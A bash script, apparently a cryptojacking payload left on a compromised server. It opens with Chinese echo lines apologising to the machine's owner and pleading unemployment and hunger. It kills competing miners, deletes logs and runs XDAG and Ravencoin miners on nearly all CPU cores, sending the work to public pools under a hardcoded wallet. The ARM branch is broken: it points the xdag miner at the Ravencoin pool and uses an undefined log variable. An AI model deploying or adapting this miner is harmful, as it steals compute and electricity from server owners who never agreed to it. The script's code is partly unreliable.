#!/bin/bash

echo "对不起"
echo "对不起"
echo "对不起"
echo "重要的事情说三遍..."
echo "同是运维岗,失业一年之久"
echo "没钱吃饭了,搞点泡面吃,绕我一命,感谢,万分感谢."


ProxyIP1="xdagmine.com:3232"
ProxyIP2="stratum+ssl://rvnssl-asia.f2pool.com:3640"
Wallet="8qdb2c1qfrL19R83mux1LdmGRgBASrqmm"
RunLog1="/root/Miner/Run.log"
RunLog2="/root/Miner/Run1.log"

pkill -9 minerARM 2>/dev/null
pkill -9 minerX86 2>/dev/null
pkill -9 nbminer 2>/dev/null
rm -rf $RunLog1 2>/dev/null
rm -rf $RunLog2 2>/dev/null

CORES=$(cat /proc/cpuinfo | grep "processor" | wc -l)
ARCH=$(lscpu | grep Architecture | awk '{print $2}')
UseCORE=$((CORES - 2))

if [ "$ARCH" = "x86_64" ]; then
    echo -e "CPU架构为：X86"
    ./minerX86 -a xdag -o $ProxyIP1 --user $Wallet -p X86 -t $UseCORE --donate-level 0 --log-file $RunLog1 --print-time 1 -B
    nohup ./nbminer -a kawpow -o $ProxyIP2 -u xiaoan6666.x --fee 0 --log-file Run1.log & 
    while true
    do
      cpu_accepted=$(tail -n 10 Run.log | grep "cpu      accepted" | tail -n 1)
      miner_speed=$(tail -n 10 Run.log | grep "miner    speed" | tail -n 1)
      RVN_speed=$(tail -n 10 Run1.log | grep "kawpow - On Pool" | tail -n 1)
      RVN_accepted=$(tail -n 10 Run1.log | grep "Share accepted" | tail -n 1)
      echo -e "\e[1;32mMiner_X86　　$CORES　$cpu_accepted\e[0m"
      echo -e "\e[1;32mMiner_X86　　$CORES　$miner_speed\e[0m"
      echo -e "\033[36mNBMiner　　　$CORES　$RVN_speed\033[0m"
      echo -e "\033[36mNBMiner　　　$CORES　$RVN_accepted\033[0m"
      sleep 1
    done

elif [ "$ARCH" = "aarch64" ]; then
    echo -e "CPU架构为：ARM"
    ./minerARM -a xdag -o $ProxyIP2 --user $Wallet -p ARM -t $CORES --donate-level 0 --log-file $RunLog --print-time 1 -B
    while true
    do
      cpu_accepted=$(tail -n 10 Run.log | grep "cpu      accepted" | tail -n 1)
      miner_speed=$(tail -n 10 Run.log | grep "miner    speed" | tail -n 1)
      echo -e "\e[1;32mMiner_ARM　　$CORES　$cpu_accepted\e[0m"
      echo -e "\e[1;36mMiner_ARM　　$CORES　$miner_speed\e[0m"
      sleep 1
    done

else
    echo -e "\e[1;41m 无法确认CPU架构,且进程运行异常\e[0m"
fi
